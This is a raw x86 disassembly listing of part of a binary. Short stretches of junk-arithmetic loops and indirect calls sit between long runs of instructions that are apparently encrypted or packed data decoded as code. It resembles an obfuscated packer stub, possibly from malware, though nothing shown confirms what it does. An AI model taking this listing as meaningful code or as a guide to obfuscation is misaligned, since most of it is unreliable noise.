  406b8e:	jae    0x406bc3
  406b94:	cmp    DWORD PTR ds:0x4303d7,0x1e
  406b9b:	jne    0x406bbe
  406ba1:	push   DWORD PTR [ebp-0x1c]
  406ba4:	push   0x42e6e6
  406ba9:	push   0x798e
  406bae:	push   0x8b33
  406bb3:	push   0x403f
  406bb8:	call   DWORD PTR ds:0x42e9a7
  406bbe:	jmp    0x406b7a
  406bc3:	xor    edx,eax
  406bc5:	xor    ecx,ecx
  406bc7:	xor    ecx,DWORD PTR ds:0x42e6c8
  406bcd:	add    DWORD PTR ds:0x43033d,ecx
  406bd3:	mov    ecx,0x32729b
  406bd8:	movzx  edi,WORD PTR ds:0x42eccb
  406bdf:	and    edi,DWORD PTR ds:0x4303e3
  406be5:	mov    DWORD PTR ds:0x42eccb,edi
  406beb:	jmp    0x406d9c
  406bf0:	cld    
  406bf1:	ss aam 0xb
  406bf4:	je     0x406bdf
  406bf6:	inc    ecx
  406bf7:	mov    cl,0xca
  406bf9:	mov    ebp,0x4fd57504
  406bfe:	push   cs
  406bff:	shl    DWORD PTR [ebp+0x3a],1
  406c02:	jle    0x406c82
  406c04:	mov    bh,BYTE PTR [edi+0x7e]
  406c07:	jle    0x406ba6
  406c09:	push   DWORD PTR ds:0x16ab8661
  406c0f:	xchg   DWORD PTR [eax],edi
  406c11:	mov    ch,0x75
  406c13:	test   DWORD PTR [edx+ebp*1+0x381a28e4],0x9ec03333
  406c1e:	in     al,0x93
  406c20:	scas   eax,DWORD PTR es:[edi]
  406c21:	fs (bad) 
  406c23:	repz adc al,0x1a
  406c26:	div    BYTE PTR [ecx-0x15]
  406c29:	push   ecx
  406c2a:	lds    ebp,FWORD PTR [ebx]
  406c2c:	jno    0x406c7f
  406c2e:	outs   dx,BYTE PTR ds:[esi]
  406c2f:	das    
  406c30:	int3   
  406c31:	addr16 xchg edx,eax
  406c33:	mov    bl,0xaf
  406c35:	push   0x42b01e22
  406c3a:	xchg   DWORD PTR [edi-0x473f6489],edx
  406c40:	pop    es
  406c41:	pushf  
  406c42:	ss loope 0x406c2d
  406c45:	stos   DWORD PTR es:[edi],eax
  406c46:	or     BYTE PTR [edi-0x8],ah
  406c49:	call   0xc2cc9a1a
  406c4e:	fild   QWORD PTR [edi]
  406c50:	mov    edx,0xc6b04869
  406c55:	adc    al,0x10
  406c57:	or     BYTE PTR [eax],al
  406c59:	aam    0x98
  406c5b:	jmp    0x406c64
  406c5d:	inc    ebx
  406c5e:	fnstsw WORD PTR [edi-0x50]
  406c61:	ret    0x4689
  406c64:	xchg   edi,eax
  406c65:	or     eax,0x929eb552
  406c6a:	rol    DWORD PTR [ebp+0x0],1
  406c6d:	retf   
  406c6e:	ins    BYTE PTR es:[edi],dx
  406c6f:	sbb    DWORD PTR [ecx],eax
  406c71:	inc    ebx
  406c72:	mov    ch,BYTE PTR [edi+ebp*4-0x5348e5a8]
  406c79:	out    dx,eax
  406c7a:	(bad)  
  406c7b:	xchg   edi,eax
  406c7c:	outs   dx,BYTE PTR ds:[esi]
  406c7d:	pop    ebx
  406c7f:	out    0xfa,eax
  406c81:	xchg   edi,eax
  406c82:	add    al,0xbb
  406c84:	and    al,0x28
  406c86:	inc    ebp
  406c87:	adc    edi,DWORD PTR [edx+ebx*2-0x746babc]
  406c8e:	mov    cl,0xc7
  406c90:	mov    eax,0x691faa41
  406c95:	cmp    DWORD PTR [eax],0xc4cc094e
  406c9b:	stos   DWORD PTR es:[edi],eax
  406c9c:	in     eax,0xf1
  406c9e:	pop    ss
  406c9f:	(bad)  
  406ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ca1:	outs   dx,BYTE PTR gs:[esi]
  406ca3:	mov    ebp,0xaa65b511
  406ca8:	inc    esi
  406ca9:	rcr    DWORD PTR [eax+0x69],1
  406cac:	push   esp
  406cad:	push   esi
  406cae:	test   DWORD PTR [esi+0x34],edi
  406cb1:	shl    DWORD PTR [ecx],0x3
  406cb4:	and    DWORD PTR [esi+0x78],edi
  406cb7:	fild   QWORD PTR [edi-0x31]
  406cba:	cmovae esi,DWORD PTR [edi]
  406cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cbe:	icebp  
  406cbf:	mov    ds:0xba0707ab,al
  406cc4:	or     eax,0xd9cbbe15
  406cc9:	cmp    al,0x30
  406ccb:	popf   
  406ccc:	cmp    eax,0x18c663f7
  406cd1:	or     BYTE PTR [esi],dh
  406cd3:	jp     0x406cbc
  406cd5:	fsubr  st,st(6)
  406cd7:	(bad)  
  406cd8:	fcom   DWORD PTR [esi+0x68]
  406cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cdc:	jae    0x406cbc
  406cde:	sub    al,dl
  406ce0:	int    0x71
  406ce2:	cmp    ah,BYTE PTR [ebp+0x1c]
  406ce5:	cmp    ch,BYTE PTR ds:0x73f6f998
  406ceb:	jmp    0x85ba99ba
  406cf0:	jge    0x406c75
  406cf2:	jne    0x406c8f
  406cf4:	pop    eax
  406cf5:	jbe    0x406d37
  406cf7:	inc    edi
  406cf8:	in     eax,dx
  406cf9:	sar    BYTE PTR [edi+0x66626161],1
  406cff:	pop    ebx
  406d00:	xlat   BYTE PTR ds:[ebx]
  406d01:	gs mov edx,esi
  406d04:	mov    ds:0x69289082,al
  406d09:	ret    
  406d0a:	shl    BYTE PTR [eax-0x47],0xa2
  406d0e:	dec    edx
  406d0f:	jne    0x406cd0
  406d11:	sbb    al,0x97
  406d13:	sbb    edi,esi
  406d15:	add    BYTE PTR [esi+0x17],0xd8
  406d19:	aaa    
  406d1a:	mov    BYTE PTR [edi+0x3b],0x75
  406d1e:	call   0x97391c90
  406d23:	(bad)  
  406d26:	inc    eax
  406d27:	add    ebx,0xffffffa6
  406d2a:	and    al,BYTE PTR [esi+eiz*4]
  406d2d:	pop    es
  406d2e:	push   cs
  406d2f:	jecxz  0x406da4
  406d31:	jg     0x406d32
  406d33:	xchg   esp,eax
  406d34:	add    ah,BYTE PTR [eax-0x17]
  406d37:	push   edx
  406d38:	loopne 0x406d71
  406d3a:	sahf   
  406d3b:	nop
  406d3c:	xchg   ebp,eax
  406d3d:	daa    
  406d3e:	jns    0x406d2e
  406d40:	dec    edi
  406d41:	jge    0x406d7e
  406d43:	jmp    0xd292:0x4045c907
  406d4a:	add    eax,ecx
  406d4c:	rcr    BYTE PTR [ecx-0x31661d80],0xe
  406d53:	jno    0x406db9
  406d55:	add    BYTE PTR [edi],ah
  406d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d58:	dec    esi
  406d59:	inc    ecx
  406d5a:	outs   dx,BYTE PTR ds:[esi]
  406d5b:	ds push eax
  406d5d:	loopne 0x406d05
  406d5f:	mov    ds:0x81549969,eax
  406d64:	push   es
  406d65:	sub    ah,BYTE PTR [esi-0x4648ba6e]
  406d6b:	adc    BYTE PTR [ebx+ebp*1],0xba
  406d6f:	jmp    0xf932:0x33cc31c8
  406d76:	test   al,0x9a
  406d78:	in     eax,dx
  406d79:	fsubr  QWORD PTR [esi+0x54]
  406d7c:	sub    ebp,DWORD PTR [ecx-0x48]
  406d7f:	jno    0x406d26
  406d81:	push   ebp
  406d82:	xchg   DWORD PTR [ebx-0x8e20d81],esi
  406d88:	sub    eax,DWORD PTR ss:[edx-0x20]
  406d8c:	pop    edx
  406d8d:	xchg   ebx,eax
  406d8e:	jne    0x406d87
  406d90:	outs   dx,BYTE PTR ds:[esi]
  406d91:	popf   
  406d92:	mov    bh,0x69
  406d94:	mov    bh,0x6c
  406d96:	mov    dl,0xff
  406d98:	jg     0x406d2f
  406d9a:	cdq    
  406d9b:	sub    eax,DWORD PTR [ebx]
  406d9d:	rol    DWORD PTR [ecx+0x4303df25],1
  406da3:	add    BYTE PTR [eax],al
  406da5:	add    BYTE PTR [eax],al
  406da7:	add    BYTE PTR [ebx+0x4303df3d],cl
  406dad:	add    BYTE PTR [edi-0x77],al
  406db0:	cmp    eax,0x4303df
  406db5:	cmp    DWORD PTR ds:0x4303df,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eb23
  406dcb:	cmp    DWORD PTR ds:0x4303df,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x4303df
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x4303df,edi
  406de7:	cmp    DWORD PTR ds:0x4303df,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e6c0,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx-0x58477b7b],si
  406e0c:	push   ebx
  406e0d:	ins    DWORD PTR es:[edi],dx
  406e0e:	mov    eax,0x7e7e38f1
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e16
  406e18:	bound  edi,QWORD PTR [edi-0x78]
  406e1b:	daa    
  406e1c:	shr    BYTE PTR [ecx],cl
  406e1e:	pop    edx
  406e1f:	mov    fs,esi
  406e21:	fldenv [ebp-0x69812e4e]
  406e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e28:	in     eax,0xff
  406e2a:	aad    0x5f
  406e2c:	add    edi,0x237cc77b
  406e32:	or     eax,eax
  406e34:	pop    ecx
  406e35:	(bad)  
  406e36:	xchg   edx,eax
  406e37:	cmp    ecx,DWORD PTR [eax+ebx*8-0x6b]
  406e3b:	ret    
  406e3c:	rol    DWORD PTR [ebx+eiz*4],1
  406e3f:	sbb    edi,DWORD PTR [ebp-0x8b2fa13]
  406e45:	leave  
  406e46:	dec    ebx
  406e47:	in     eax,0x9d
  406e49:	(bad)  
  406e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e4b:	or     DWORD PTR ds:0xb72f218b,0x477ec4ec
  406e55:	add    BYTE PTR ds:0xd9dcc2e9,0x4d
  406e5c:	xor    al,0x69
  406e5e:	add    BYTE PTR [ecx+0x4f],dh
  406e61:	cmp    al,0x64
  406e63:	xchg   esi,eax
  406e64:	sbb    edi,DWORD PTR [eax+0x3ad3ca0]
  406e6a:	ins    DWORD PTR es:[edi],dx
  406e6b:	jo     0x406e00
  406e6d:	jbe    0x406e9c
  406e6f:	gs mov edi,0x83adc58c
  406e75:	jge    0x406e4f
  406e77:	sbb    DWORD PTR [ecx],eax
  406e79:	pop    ecx
  406e7a:	mov    ah,0x69
  406e7c:	mov    esi,0x5c46ea64
  406e81:	pop    edx
  406e82:	addr16 cmc 
  406e84:	jl     0x406f01
  406e86:	popf   
  406e87:	ret    0x622
  406e8a:	cmp    eax,0xdbfbd8f3
  406e8f:	inc    edx
  406e90:	sar    al,0x5b
  406e93:	sub    ah,BYTE PTR [esi-0x394abf60]
  406e99:	xor    DWORD PTR [edx+edx*1-0x5b],esp
  406e9d:	imul   ebp,DWORD PTR [ecx],0x55576fa7
  406ea3:	pop    esp
  406ea4:	pop    es
  406ea5:	arpl   WORD PTR [edi+0x17],sp
  406ea8:	addr16 pusha 
  406eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406eab:	bound  edi,QWORD PTR [ebx+ebx*8+0x69bdc5a6]
  406eb2:	out    0x87,eax
  406eb4:	sub    BYTE PTR [ecx-0x79],dh
  406eb7:	gs out dx,al
  406eb9:	dec    eax
  406eba:	pop    ebx
  406ebb:	sbb    esi,esp
  406ebd:	cdq    
  406ebe:	xchg   ebp,eax
  406ebf:	loope  0x406f20
  406ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ec2:	xchg   esp,eax
  406ec3:	cmc    
  406ec4:	js     0x406e5a
  406ec6:	call   0x6c8d:0x92a69590
  406ecd:	xchg   esi,eax
  406ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ecf:	jns    0x406eaf
  406ed1:	jae    0x406e71
  406ed3:	lahf   
  406ed4:	out    dx,eax
  406ed5:	xchg   edi,ebx
  406ed7:	daa    
  406ed8:	ret    
  406ed9:	rol    DWORD PTR [ebx+0x3b58cef9],0x62
  406ee0:	mov    edi,0xd61f1b03
  406ee5:	fiadd  WORD PTR [ecx]
  406ee7:	pop    eax
  406ee8:	test   eax,0x83fda4f7
  406eed:	(bad)  
  406eee:	mov    DWORD PTR [ebp-0x2fc6a7cb],esi
  406ef4:	mov    DWORD PTR ds:0x47b861b1,edi
  406efa:	add    dl,BYTE PTR [esi-0x37567576]
  406f00:	dec    esi
  406f01:	inc    eax
  406f02:	test   DWORD PTR [edx-0x80],esp
  406f05:	add    eax,0xd3e0a9c0
  406f0a:	dec    edi
  406f0b:	or     ah,BYTE PTR [edx+0x58d808e8]
  406f11:	call   0x2d2e:0xe4f8f416
  406f18:	aaa    
  406f19:	cmp    eax,eax
  406f1b:	mov    esi,0x5c1d034b
  406f20:	stos   DWORD PTR es:[edi],eax
  406f21:	cmp    eax,0xb18a615e
  406f26:	int3   
  406f27:	lds    esp,FWORD PTR [ecx-0x50]
  406f2a:	mov    ebp,ebx
  406f2c:	jae    0x406ebe
  406f2e:	fwait
  406f2f:	adc    BYTE PTR [esi],0x6c
  406f32:	lahf   
  406f33:	and    eax,0x497cd08
  406f38:	dec    esi
  406f39:	add    eax,0xcdcc9617
  406f3e:	cwde   
  406f3f:	std    
  406f40:	int    0x77
  406f42:	retf   
  406f43:	dec    edx
  406f44:	mov    ebx,0xf91d461e
  406f49:	mov    ecx,0xf22d475d
  406f4e:	cmc    
  406f4f:	mov    ds:0xd61161b9,al
  406f54:	cmp    esp,DWORD PTR [esi-0x207e242]
  406f5a:	xchg   BYTE PTR [esi],dl
  406f5c:	rcl    DWORD PTR [eax-0x79aff7f7],cl
  406f62:	out    0x85,eax
  406f64:	dec    edi
  406f65:	jg     0x406fdd
  406f67:	in     al,dx
  406f68:	adc    esi,eax
  406f6a:	cs push 0xa
  406f6d:	loopne 0x406f21
  406f6f:	lds    ecx,FWORD PTR [ebx]
  406f71:	cwde   
  406f72:	sahf   
  406f73:	mov    al,0x7f
  406f75:	inc    edi
  406f76:	xor    ebx,DWORD PTR fs:[esi]
  406f79:	mov    edi,0xbbcfed72
  406f7e:	aas    
  406f7f:	mov    eax,ds:0xf6f67471
  406f84:	cmc    
  406f85:	loope  0x406fe1
  406f87:	in     eax,0x3d
  406f89:	les    ebx,FWORD PTR [ebx+0x2b]
  406f8c:	shl    BYTE PTR [eax+0x54],0x8
  406f90:	pop    es
  406f91:	arpl   ax,bp
  406f93:	lds    esp,FWORD PTR [eax+0x48]
  406f96:	and    BYTE PTR [edi+esi*2+0x1b],dh
  406f9a:	inc    ebp
  406f9b:	fstp   QWORD PTR ds:0xbcb39dd8
  406fa1:	setge  BYTE PTR [ebp-0x5e]
  406fa5:	mov    ebx,0xd4634a34
  406faa:	jle    0x406f35
  406fac:	push   ebp
  406fad:	clc    
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x430365
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x430345,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x4a203d82,edx
  406fd4:	fiadd  WORD PTR [edi+0x7e7ec60d]
  406fda:	mov    bh,BYTE PTR [edi+0x7e]
  406fdd:	jle    0x406fad
  406fdf:	in     eax,dx
  406fe0:	retf   
  406fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fe2:	jo     0x406fca
  406fe4:	sbb    BYTE PTR [ebx],ch
  406fe6:	adc    dh,BYTE PTR [ecx+0x35c9ba54]
  406fec:	sub    eax,0x77fea55
  406ff1:	loop   0x406fca
  406ff3:	(bad)  
  406ff4:	adc    BYTE PTR [esi+0x13],dh
  406ff7:	(bad)  
  406ff8:	jle    0x406fd3
  406ffa:	pop    esi
  406ffb:	or     BYTE PTR [ecx-0x7e],0x35
  406fff:	pop    ds
  407000:	adc    edx,DWORD PTR [edx-0x44]
  407003:	pop    ds
  407004:	(bad)  
  407006:	inc    ecx
  407007:	inc    ebx
  407008:	sub    eax,0x2128a94e
  40700d:	xor    ebx,esp
  40700f:	add    al,0x97
  407011:	push   ss
  407012:	mov    ?,WORD PTR [esi-0x24]
  407015:	popf   
  407016:	inc    edi
  407017:	into   
  407018:	mov    eax,0xc613f6b8
  40701d:	add    DWORD PTR [edx+0x67],ebp
  407020:	and    eax,ecx
  407022:	add    cl,BYTE PTR [edx-0x47794d9c]
  407028:	aad    0x9
  40702a:	data16 fst st(7)
  40702d:	ds jle 0x407001
  407030:	sub    eax,0xcdcdb156
  407035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407036:	inc    ebp
  407037:	cmp    al,0xd8
  407039:	adc    edx,eax
  40703b:	fstp   TBYTE PTR [ecx-0x73]
  40703e:	dec    edi
  40703f:	xchg   edx,eax
  407040:	das    
  407041:	popf   
  407042:	mov    dh,BYTE PTR [ebp-0xc]
  407045:	and    DWORD PTR [edi+0x48],esi
  407048:	xchg   edi,eax
  407049:	pop    ds
  40704a:	cmp    esi,DWORD PTR [esp+eax*4]
  40704d:	imul   ebx,DWORD PTR [bx+di-0xfb1],0x59be302f
  407056:	xchg   edx,eax
  407057:	outs   dx,BYTE PTR ds:[esi]
  407058:	call   0xfdd8:0xed7b4d42
  40705f:	xor    DWORD PTR [ebx-0x37836099],edi
  407065:	adc    ch,BYTE PTR [edi]
  407067:	adc    al,0x6
  407069:	pop    ecx
  40706a:	popf   
  40706b:	rcr    dl,1
  40706d:	je     0x40704f
  40706f:	iret   
  407070:	xor    BYTE PTR [ebp-0x498d25ff],al
  407076:	inc    edi
  407077:	xchg   ebp,eax
  407078:	loope  0x40703d
  40707a:	leave  
  40707b:	add    bl,BYTE PTR [edx]
  40707d:	mov    DWORD PTR fs:[edi+0x68b2c26a],0x5d5cf1cc
  407088:	je     0x407032
  40708a:	int3   
  40708b:	cmp    al,0xef
  40708d:	into   
  40708e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40708f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407090:	mov    ch,0x6c
  407092:	mov    ch,BYTE PTR [edx+0x77]
  407095:	ins    BYTE PTR es:[edi],dx
  407096:	cdq    
  407097:	jmp    DWORD PTR [edx]
  407099:	xor    eax,0x5acf0ef0
  40709e:	test   ecx,0xc25a3d39
  4070a4:	(bad)  
  4070a6:	icebp  
  4070a7:	or     eax,0x6f44f83d
  4070ac:	jbe    0x407072
  4070ae:	dec    eax
  4070af:	dec    ebx
  4070b0:	fdivr  DWORD PTR [eax-0xf]
  4070b3:	pop    ebp
  4070b4:	pop    ecx
  4070b5:	test   dh,0xc
  4070b8:	aaa    
  4070b9:	shl    BYTE PTR [ebx],cl
  4070bb:	es xchg esi,eax
  4070bd:	jns    0x40704f
  4070bf:	push   esp
  4070c0:	ja     0x40707a
  4070c2:	(bad)  
  4070c3:	cmp    dl,BYTE PTR [edx+ebp*4]
  4070c6:	adc    al,0x80
  4070c8:	mov    dh,0x3b
  4070ca:	and    ah,dh
  4070cc:	xchg   ecx,eax
  4070cd:	ja     0x4070e7
  4070cf:	sbb    al,0xd6
  4070d1:	jl     0x4070ed
  4070d3:	add    eax,0xac440575
  4070d8:	retf   0x642a
  4070db:	add    al,BYTE PTR [esp+ebx*4]
  4070de:	mov    eax,ds:0x54217285
  4070e3:	fistp  QWORD PTR [esi]
  4070e6:	fbstp  TBYTE PTR [edi]
  4070e8:	mov    edi,0x588a7d27
  4070ed:	gs add al,0x9b
  4070f0:	(bad)  
  4070f1:	sti    
  4070f2:	(bad)  
  4070f3:	call   0x8215574c
  4070f8:	neg    DWORD PTR [eax-0x311cf73a]
  4070fe:	int    0x4b
  407100:	push   edi
  407101:	cmp    dl,BYTE PTR ds:0x4e9d71e8
  407107:	add    DWORD PTR [ecx-0x58],edi
  40710a:	mov    al,ds:0xc95fcf0f
  40710f:	and    DWORD PTR [ebx],esi
  407111:	xchg   dh,bh
  407113:	(bad)  
  407114:	push   edi
  407115:	imul   ebp,esi,0xffffffb1
  407118:	test   eax,0x1bc10b67
  40711d:	lea    esi,[ebx+ebx*1-0x5fa8e979]
  407124:	jmp    0x84e0dcc7
  407129:	and    eax,eax
  40712b:	and    al,ch
  40712d:	hlt    
  40712e:	xchg   esp,eax
  40712f:	mov    dl,0x3b
  407131:	cmp    BYTE PTR [ebx+0x3c],ch
  407134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407135:	call   0x61f2557f
  40713a:	and    al,0x8a
  40713c:	pop    es
  40713d:	fwait
  40713e:	dec    eax
  40713f:	mov    WORD PTR [esi-0x1f053d86],gs
  407145:	ret    
  407146:	jno    0x4070cf
  407148:	sbb    eax,0x31e1db0c
  40714d:	inc    ecx
  40714e:	ins    BYTE PTR es:[edi],dx
  40714f:	das    
  407150:	cs fwait
  407152:	shr    ebp,cl
  407154:	in     al,dx
  407155:	pusha  
  407156:	cwde   
  407157:	stc    
  407158:	push   esp
  407159:	mov    edx,0x86db5226
  40715e:	and    edx,DWORD PTR [eax]
  407160:	je     0x4071dc
  407162:	stc    
  407163:	je     0x407196
  407165:	inc    ebp
  407166:	pop    edi
  407167:	call   0x521c:0x44c442f8
  40716e:	fsubp  st(6),st
  407170:	mov    bl,0x5d
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e6c0,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e6c0
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e6c0,edi
  407191:	cmp    DWORD PTR ds:0x42e6c0,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e6c0,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e9ab
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x430369,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x43034d
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x430361,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x430361
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x430361,edi
  4071fa:	cmp    DWORD PTR ds:0x430361,0x6
  407201:	jne    0x407247
  407207:	push   0x42e829
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e9af
  407247:	cmp    DWORD PTR ds:0x430361,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x430361
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x430361,edi
  407261:	cmp    DWORD PTR ds:0x430361,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e6bc
  40728e:	or     DWORD PTR ds:0x430365,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x3b973f15
  4072a7:	sbb    eax,0x7ec799d7
  4072ac:	jle    0x407238
  4072ae:	jg     0x40732e
  4072b0:	jle    0x407312
  4072b2:	or     BYTE PTR [ebx-0x1e],0x58
  4072b6:	mov    bl,0x95
  4072b8:	adc    eax,0x987de28c
  4072bd:	es (bad) 
  4072bf:	mov    ah,0xd9
  4072c1:	mov    dh,0xa9
  4072c3:	retf   
  4072c4:	cdq    
  4072c5:	sub    ebx,ebp
  4072c7:	dec    ecx
  4072c8:	daa    
  4072c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072ca:	(bad)  
  4072cb:	shl    edx,cl
  4072cd:	mov    dh,0xdb
  4072cf:	push   ds
  4072d0:	pop    es
  4072d1:	lahf   
  4072d2:	iret   
  4072d3:	fstp   QWORD PTR [eax-0x883e156]
  4072d9:	out    dx,al
  4072da:	ror    BYTE PTR [ebp+0x19815d2a],0x64
  4072e1:	ins    DWORD PTR es:[edi],dx
  4072e2:	inc    esp
  4072e3:	fcomp  QWORD PTR [edx-0x3b]
  4072e6:	mov    dh,0xe3
  4072e8:	gs iret 
  4072ea:	rcl    DWORD PTR ss:[edx-0x6e],cl
  4072ee:	jg     0x40731d
  4072f0:	in     al,dx
  4072f1:	adc    al,0x23
  4072f3:	ja     0x407349
  4072f5:	(bad)  
  4072f6:	ret    0xe93
  4072f9:	rol    BYTE PTR [esi+0x7afc2725],0xb9
  407300:	xchg   ebx,eax
  407301:	xchg   ebp,eax
  407302:	lods   eax,DWORD PTR ds:[esi]
  407303:	inc    edx
  407304:	xor    eax,0xc7fa165c
  407309:	and    eax,DWORD PTR [edx+0x31f66b07]
  40730f:	push   esi
  407310:	rcr    BYTE PTR [esi+ecx*2+0xd],cl
  407314:	ins    BYTE PTR es:[edi],dx
  407315:	add    DWORD PTR [eax+0xa],esp
  407318:	ror    BYTE PTR [edx],1
  40731a:	pop    ecx
  40731b:	pop    esp
  40731c:	mov    ds:0x2c7fbf57,al
  407321:	dec    edi
  407322:	jmp    DWORD PTR [eax]
  407324:	div    eax
  407326:	out    0x2f,al
  407328:	mov    BYTE PTR [esi+0x74],0x87
  40732c:	mov    ebp,0xe7e4d3d
  407331:	fadd   DWORD PTR [eax+0x51288cfa]
  407337:	adc    dh,BYTE PTR [esi]
  407339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40733a:	sahf   
  40733b:	mov    al,ds:0x93c4a436
  407340:	xchg   DWORD PTR [esi+ebx*2-0x695ffe3b],edi
  407347:	cmp    BYTE PTR [esi-0x3f],ch
  40734a:	ja     0x4072ee
  40734c:	test   DWORD PTR [esi],edi
  40734e:	jle    0x407398
  407350:	int    0xae
  407352:	pop    ebp
  407353:	jbe    0x40736c
  407355:	sbb    al,0xea
  407357:	test   DWORD PTR ds:0x2cf79e3b,0x71ece229
  407361:	fadd   st,st(6)
  407363:	cmp    BYTE PTR [eax],ch
  407365:	(bad)  
  407366:	jnp    0x4073ae
  407368:	xlat   BYTE PTR ds:[ebx]
  407369:	sub    al,0xb1
  40736b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40736c:	cld    
  40736d:	(bad)  
  40736e:	mov    bh,BYTE PTR gs:[edi]
  407371:	xor    esi,DWORD PTR [ecx+edi*4+0x2b]
  407375:	test   DWORD PTR [esi+0x4ff210ca],eax
  40737b:	xlat   BYTE PTR ds:[ebx]
  40737c:	lds    ecx,FWORD PTR [edx-0xb5c4908]
  407382:	mov    esp,0x448eb90a
  407387:	sub    al,0xde
  407389:	out    0x0,eax
  40738b:	jecxz  0x407360
  40738d:	jns    0x407357
  40738f:	add    dh,BYTE PTR [esi+0x30]
  407392:	adc    cl,al
  407394:	sbb    al,0x11
  407396:	sub    dh,BYTE PTR [edx+0x32]
  407399:	or     DWORD PTR [ebx+0x15],ecx
  40739c:	shr    BYTE PTR [edi],0x49
  40739f:	test   al,0xb8
  4073a1:	call   0x369e:0xf41d78f4
  4073a8:	imul   ecx,esi,0x30
  4073ab:	mov    eax,DWORD PTR [ebp+0x49]
  4073ae:	xchg   esi,eax
  4073af:	jg     0x407336
  4073b1:	cwde   
  4073b2:	fmul   DWORD PTR [eax]
  4073b4:	sub    BYTE PTR fs:[ebp+esi*8-0x21],0xfa
  4073ba:	xor    eax,0xfb99e850
  4073bf:	jmp    0x6e4f:0x36e65775
  4073c6:	shl    BYTE PTR [esi],cl
  4073c8:	repz mov edi,0xcfb80aa5
  4073ce:	inc    ecx
  4073cf:	aam    0xd5
  4073d1:	mov    eax,0xa5cef114
  4073d6:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4073d8:	dec    edi
  4073d9:	fild   DWORD PTR [ebx]
  4073db:	rcr    BYTE PTR [esi-0x32],0x98
  4073df:	dec    ebx
  4073e0:	adc    al,0xcb
  4073e2:	cmp    DWORD PTR [ebx+ebx*2-0x3a],ecx
  4073e6:	scas   eax,DWORD PTR es:[edi]
  4073e7:	(bad)  
  4073e8:	fstp   DWORD PTR [eax-0x219faf96]
  4073ee:	lods   al,BYTE PTR ds:[esi]
  4073ef:	into   
  4073f0:	out    dx,eax
  4073f1:	iret   
  4073f2:	shl    edx,0x71
  4073f5:	jp     0x4073be
  4073f7:	sub    ebp,DWORD PTR [edi]
  4073f9:	dec    ebp
  4073fa:	mov    al,BYTE PTR [edi-0x3a962c5d]
